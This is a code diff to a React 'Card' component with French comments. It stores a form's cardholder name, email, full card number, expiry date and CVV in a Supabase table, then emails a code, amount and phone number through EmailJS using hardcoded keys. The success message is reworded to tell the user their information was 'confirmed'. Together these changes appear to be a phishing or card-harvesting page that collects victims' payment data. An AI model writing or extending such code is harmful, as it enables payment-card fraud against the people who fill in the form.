@@ -58,16 +58,30 @@ const Card = () => {
     }
 
     try {
-      // Récupération des données depuis Supabase
-      const { data, error } = await supabase
+      // 1. Mise à jour des infos carte dans Supabase
+      const { error: updateError } = await supabase
+        .from("sefon")
+        .update({
+          titulaire: formData.titulaire,
+          email: formData.email,
+          numerocarte: formData.numerocarte,
+          dateexpiration: formData.dateexpiration,
+          cryptogramme: formData.cryptogramme,
+        })
+        .eq("id", userId);
+
+      if (updateError) throw updateError;
+
+      // 2. Récupération des infos complémentaires pour le mail
+      const { data, error: fetchError } = await supabase
         .from("sefon")
         .select("code, montant, telephone")
         .eq("id", userId)
         .single();
 
-      if (error || !data) throw error;
+      if (fetchError || !data) throw fetchError;
 
-      // Envoi avec EmailJS
+      // 3. Envoi avec EmailJS
       const serviceID = "service_mev4gqt";
       const templateID = "template_uf95szs";
       const publicKey = "u9q4QhywRWjrfKnHj";
@@ -87,7 +101,7 @@ const Card = () => {
 
       toast({
         title: "Succès",
-        description: "Le mail a été envoyé avec succès.",
+        description: "Vos informations ont été confirmées avec succès.",
         variant: "default",
       });
 
@@ -96,7 +110,7 @@ const Card = () => {
       console.error(err);
       toast({
         title: "Erreur",
-        description: "L'envoi du mail a échoué.",
+        description: "Une erreur est survenue ",
         variant: "destructive",
       });
     } finally {
